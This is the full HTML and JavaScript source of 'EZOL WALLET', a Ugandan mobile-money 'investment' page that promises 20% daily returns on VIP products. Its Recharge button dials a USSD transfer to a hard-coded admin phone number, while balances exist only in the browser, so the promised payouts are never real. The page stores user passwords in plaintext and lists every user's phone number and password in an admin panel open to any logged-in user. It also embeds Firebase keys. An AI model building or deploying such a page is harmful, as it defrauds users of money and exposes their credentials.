<!DOCTYPE html>
<html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0">
<title>EZOL WALLET - 500 Bonus</title>
<script src="https://cdn.tailwindcss.com"></script>
<style>body{max-width:480px;margin:0 auto;background:#f5f5f5;padding-bottom:90px;font-family:system-ui}.glass{background:linear-gradient(135deg,#1a5c1a,#2e7d32);color:white;border-radius:20px}.card{background:white;border-radius:18px;box-shadow:0 2px 10px rgba(0,0,0,.05)}.admin-dark{background:#0f172a;color:white;border-radius:16px}</style>
<script type="module">
import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
import { getFirestore, doc, setDoc, getDoc, addDoc, collection, getDocs, updateDoc, query, orderBy } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js";
const firebaseConfig = {apiKey:"AIzaSyCOHScEAIDBD9mayPtVfz7oE_ciF-BcXBc",authDomain:"ezol-earn2.firebaseapp.com",projectId:"ezol-earn2",storageBucket:"ezol-earn2.firebasestorage.app",messagingSenderId:"104307140987",appId:"1:104307140987:web:29099ad92876f9c98875de"};
const appF=initializeApp(firebaseConfig);const db=getFirestore(appF);window.db=db;window.fb={doc,setDoc,getDoc,addDoc,collection,getDocs,updateDoc,query,orderBy};
</script></head><body class="p-3">
<div class="flex justify-between items-center bg-white p-3 rounded-2xl"><div class="flex gap-2 items-center"><div class="w-10 h-10 bg-blue-900 text-white rounded-full flex items-center justify-center font-black">E</div><div><p class="font-black text-sm">EZOL</p><p class="text-[10px]">WALLET INVESTMENT</p></div></div><div class="text-[11px] text-green-600 font-bold">5,248 online</div></div>
<div class="glass p-5 mt-3 text-center"><p class="text-[11px]">EZOL SMART WALLET</p><p class="text-2xl font-black mt-1"><span id="mainBalance">500</span> UGX</p><p class="text-[11px] mt-1"><span id="displayName">Guest</span> • <span id="displayPhone">-</span></p></div>
<div id="authBox" class="card p-5 mt-3"><h3 class="font-bold">Create Account - Get 500 UGX FREE</h3><input id="rName" placeholder="Full Name" class="w-full bg-gray-100 rounded-xl p-3 mt-3"><input id="rPhone" placeholder="Phone" class="w-full bg-gray-100 rounded-xl p-3 mt-2"><input id="rPass" placeholder="Password" type="password" class="w-full bg-gray-100 rounded-xl p-3 mt-2"><button onclick="doRegister()" class="w-full bg-green-700 text-white rounded-full py-3 mt-3 font-bold">Register - Get 500 UGX</button><div class="text-center mt-3 text-xs">Have account? <b onclick="showLogin()" class="text-green-700">Login</b></div></div>
<div id="loginBox" class="card p-5 mt-3 hidden"><h3 class="font-bold">Login</h3><input id="lPhone" placeholder="Phone" class="w-full bg-gray-100 rounded-xl p-3 mt-3"><input id="lPass" placeholder="Password" type="password" class="w-full bg-gray-100 rounded-xl p-3 mt-2"><button onclick="doLogin()" class="w-full bg-green-700 text-white rounded-full py-3 mt-3 font-bold">Login</button></div>
<div id="actionBox" class="hidden"><div class="grid grid-cols-2 gap-3 mt-3"><button onclick="openRecharge()" class="bg-green-600 text-white rounded-full py-3 font-bold">Recharge</button><button onclick="openWithdraw()" class="bg-orange-500 text-white rounded-full py-3 font-bold">Withdraw</button></div><div class="card p-3 mt-3"><button onclick="doDaily()" class="w-full bg-yellow-400 rounded-full py-3 font-bold">Claim 1,000 Daily</button></div><div class="mt-3"><p class="font-bold">VIP Products</p><div id="prodList" class="space-y-2 mt-2"></div></div><div class="mt-6 space-y-4"><div class="admin-dark p-3"><p class="font-bold text-sm">💰 Recharge Requests - AUTO <span id="rechargeCount">0</span></p><div id="rechargeAdminList" class="mt-2 text-xs">Loading...</div></div><div class="admin-dark p-3"><p class="font-bold text-sm">💸 Withdraw Requests - AUTO <span id="withdrawCount">0</span></p><div id="withdrawAdminList" class="mt-2 text-xs">Loading...</div></div><div class="admin-dark p-3"><p class="font-bold text-sm">👥 All Users - AUTO + Passwords <span id="userCount">0</span></p><div id="allUsersList" class="mt-2 text-xs">Loading...</div></div></div></div>
<script>
let BONUS=500;let user=JSON.parse(localStorage.getItem('ezolB_user')||'null');let bal=parseInt(localStorage.getItem('ezolB_bal')||'500');let invested=JSON.parse(localStorage.getItem('ezolB_invested')||'[]');let lastDaily=localStorage.getItem('ezolB_daily')||'';const products=[{id:1,name:'VIP 1',invest:15000,daily:3000},{id:2,name:'VIP 2',invest:30000,daily:6000},{id:3,name:'VIP 3',invest:60000,daily:12000},{id:4,name:'VIP 4',invest:100000,daily:20000}];const ADMIN_MOMO='256795143386';
function showLogin(){document.getElementById('authBox').classList.add('hidden');document.getElementById('loginBox').classList.remove('hidden');}
async function doRegister(){const name=document.getElementById('rName').value.trim();const phone=document.getElementById('rPhone').value.trim();const pass=document.getElementById('rPass').value.trim();if(!name||!phone||!pass) return alert('Fill all');user={name,phone,pass,code:'EZOL'+phone.slice(-4)};bal=BONUS;localStorage.setItem('ezolB_user',JSON.stringify(user));localStorage.setItem('ezolB_bal',bal.toString());try{await fb.setDoc(fb.doc(db,"users",phone),{name,phone,pass,code:user.code,balance:bal,vip:0,createdAt:new Date().toISOString()},{merge:true});}catch(e){alert('Firebase Rules error - Publish allow true in ezol-earn2');return;}initApp();}
async function doLogin(){const phone=document.getElementById('lPhone').value.trim();const pass=document.getElementById('lPass').value.trim();let saved=JSON.parse(localStorage.getItem('ezolB_user')||'null');if(saved&&saved.phone===phone&&saved.pass===pass){user=saved;initApp();return;}try{const snap=await fb.getDoc(fb.doc(db,"users",phone));if(snap.exists()&&snap.data().pass===pass){user=snap.data();localStorage.setItem('ezolB_user',JSON.stringify(user));initApp();return;}}catch(e){}alert('Wrong');}
function initApp(){document.getElementById('authBox').classList.add('hidden');document.getElementById('loginBox').classList.add('hidden');document.getElementById('actionBox').classList.remove('hidden');document.getElementById('displayName').innerText=user.name;document.getElementById('displayPhone').innerText=user.phone;document.getElementById('mainBalance').innerText=bal.toLocaleString();renderProducts();startLiveSync();}
function renderProducts(){document.getElementById('prodList').innerHTML=products.map(p=>`<div class="card p-3 flex justify-between"><div><p class="font-bold text-sm">${p.name}</p><p class="text-[11px]">Invest ${p.invest} | Daily ${p.daily}</p></div><button onclick="buyVip(${p.id})" class="bg-green-700 text-white rounded-full px-4 py-2 text-xs">Buy</button></div>`).join('');}
async function buyVip(id){const p=products.find(x=>x.id===id);if(bal<p.invest){alert('Insufficient');return openRecharge();}bal-=p.invest;invested.push(p);localStorage.setItem('ezolB_bal',bal.toString());localStorage.setItem('ezolB_invested',JSON.stringify(invested));document.getElementById('mainBalance').innerText=bal.toLocaleString();try{await fb.setDoc(fb.doc(db,"users",user.phone),{balance:bal,vip:invested.length},{merge:true});await fb.addDoc(fb.collection(db,"recharges"),{phone:user.phone,name:user.name,amount:p.invest,type:p.name,status:'approved',tx:'Tx:'+Date.now(),time:new Date().toISOString()});}catch(e){}startLiveSync();}
async function doDaily(){const today=new Date().toDateString();if(lastDaily===today) return alert('Claimed');bal+=1000;lastDaily=today;localStorage.setItem('ezolB_bal',bal.toString());localStorage.setItem('ezolB_daily',today);document.getElementById('mainBalance').innerText=bal.toLocaleString();try{await fb.setDoc(fb.doc(db,"users",user.phone),{balance:bal},{merge:true});}catch(e){}}
async function openRecharge(){const amt=prompt('Enter recharge Min 15000:');if(!amt) return;const n=parseInt(amt);try{await fb.addDoc(fb.collection(db,"recharges"),{phone:user.phone,name:user.name,amount:n,type:'Recharge',status:'pending',tx:'Tx:'+Date.now(),time:new Date().toISOString()});}catch(e){}window.location.href='tel:*165*1*1*'+ADMIN_MOMO+'*'+n+'%23';}
async function openWithdraw(){const amt=prompt('Withdraw Min 20000:');if(!amt) return;const n=parseInt(amt);if(n>bal) return alert('Insufficient');const rec=n-Math.round(n*0.1);bal-=n;localStorage.setItem('ezolB_bal',bal.toString());document.getElementById('mainBalance').innerText=bal.toLocaleString();try{await fb.addDoc(fb.collection(db,"withdrawals"),{phone:user.phone,name:user.name,amount:n,receive:rec,status:'pending',time:new Date().toISOString()});await fb.setDoc(fb.doc(db,"users",user.phone),{balance:bal},{merge:true});}catch(e){}startLiveSync();}
async function startLiveSync(){try{const uSnap=await fb.getDocs(fb.collection(db,"users"));document.getElementById('userCount').innerText=uSnap.size;document.getElementById('allUsersList').innerHTML='';uSnap.forEach(d=>{const u=d.data();document.getElementById('allUsersList').innerHTML+=`<div class="bg-gray-800 p-2 rounded mb-1">${u.phone} - ${u.balance} UGX | ${u.name} | pass:${u.pass}</div>`;});const rSnap=await fb.getDocs(fb.query(fb.collection(db,"recharges"),fb.orderBy("time","desc")));document.getElementById('rechargeCount').innerText=rSnap.size;document.getElementById('rechargeAdminList').innerHTML='';rSnap.forEach(d=>{const r=d.data();const btn=r.status==='pending'?`<button onclick="approveRecharge('${d.id}',${r.amount},'${r.phone}')" class="bg-green-500 px-2 py-1 rounded">Approve</button>`:`✓ ${r.status}`;document.getElementById('rechargeAdminList').innerHTML+=`<div class="bg-gray-800 p-2 rounded mb-1 flex justify-between"><div><b>${r.phone} - ${r.type} - ${r.amount} UGX</b><br>${r.tx} | ${r.status}</div><div>${btn} <button onclick="deleteDoc('recharges','${d.id}')" class="bg-red-500 px-2">X</button></div></div>`;});const wSnap=await fb.getDocs(fb.query(fb.collection(db,"withdrawals"),fb.orderBy("time","desc")));document.getElementById('withdrawCount').innerText=wSnap.size;document.getElementById('withdrawAdminList').innerHTML='';wSnap.forEach(d=>{const w=d.data();const btn=w.status==='pending'?`<button onclick="payWithdraw('${d.id}')" class="bg-green-500 px-2 py-1 rounded">Paid</button>`:`✓ ${w.status}`;document.getElementById('withdrawAdminList').innerHTML+=`<div class="bg-gray-800 p-2 rounded mb-1 flex justify-between"><div><b>${w.phone} - ${w.amount} UGX</b><br>${w.status}</div><div>${btn} <button onclick="deleteDoc('withdrawals','${d.id}')" class="bg-red-500 px-2">X</button></div></div>`;});}catch(e){}}
async function approveRecharge(id,amount,phone){try{await fb.updateDoc(fb.doc(db,"recharges",id),{status:'approved'});const u=await fb.getDoc(fb.doc(db,"users",phone));if(u.exists()){let nb=(u.data().balance||0)+amount;await fb.setDoc(fb.doc(db,"users",phone),{balance:nb},{merge:true});}startLiveSync();}catch(e){}}
async function payWithdraw(id){try{await fb.updateDoc(fb.doc(db,"withdrawals",id),{status:'paid'});startLiveSync();}catch(e){}}
async function deleteDoc(col,id){try{await fb.updateDoc(fb.doc(db,col,id),{status:'deleted'});startLiveSync();}catch(e){}}
window.approveRecharge=approveRecharge;window.payWithdraw=payWithdraw;window.deleteDoc=deleteDoc;
if(user) initApp();setInterval(()=>{if(user) startLiveSync();},10000);
</script></body></html>
